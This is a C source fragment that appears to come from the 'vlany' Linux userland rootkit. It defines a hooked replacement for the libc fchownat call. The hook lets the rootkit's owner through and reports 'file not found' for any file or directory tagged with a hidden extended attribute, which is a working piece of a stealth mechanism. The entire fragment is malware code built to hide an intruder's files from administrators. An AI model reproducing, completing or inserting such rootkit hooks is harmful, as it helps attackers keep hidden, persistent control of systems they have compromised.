int fchownat(int dirfd, const char *pathname, uid_t owner, gid_t group, int flags)
{
    #ifdef DEBUG
        printf("[vlany] fchownat() called\n");
    #endif

    HOOK(old_fchownat, CFCHOWNAT);

    if(owned()) return old_fchownat(dirfd, pathname, owner, group, flags);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }

    return old_fchownat(dirfd, pathname, owner, group, flags);
}
